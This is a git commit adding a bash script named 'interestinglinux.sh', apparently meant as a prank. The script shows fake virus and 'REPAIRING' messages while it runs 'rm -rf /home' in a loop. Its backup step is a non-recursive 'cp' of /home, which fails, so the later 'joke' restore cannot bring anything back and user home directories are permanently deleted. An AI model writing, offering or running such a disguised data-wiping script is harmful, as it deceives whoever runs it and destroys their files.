e3b01590899d7658cf4321507200c5fc76afec59
Logan Alldredge <lalldredge7622@uinta1.org>
2022-03-30 14:59:03 -0600

    Create interestinglinux.sh

---
+++ bash/interestinglinux.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+read -p "What is your username?" username
+mkdir /lmfao
+while cp /home /lmfao
+do
+echo "${GREEN}LOADING ASSETS"
+done
+echo -e "${RED}Detected errors with /home directory. You have a virus."
+echo -e "${BLUE}See for yourself."
+echo -e "root@$username# cd /home"
+echo -e "${RED}ERROR: NO SUCH DIRECTORY"
+while rm -rf /home
+do
+echo "${GREEN}REPAIRING"
+done
+read -p "What do you want your username to be?" usr
+mv /lmfao/home /
+mkdir /home/lmfao
+touch /home/lmfao/lmfao.sh
+echo "echo 'HA! THIS PROGRAM WAS A JOKE!'" >> /home/lmfao/lmfao.sh
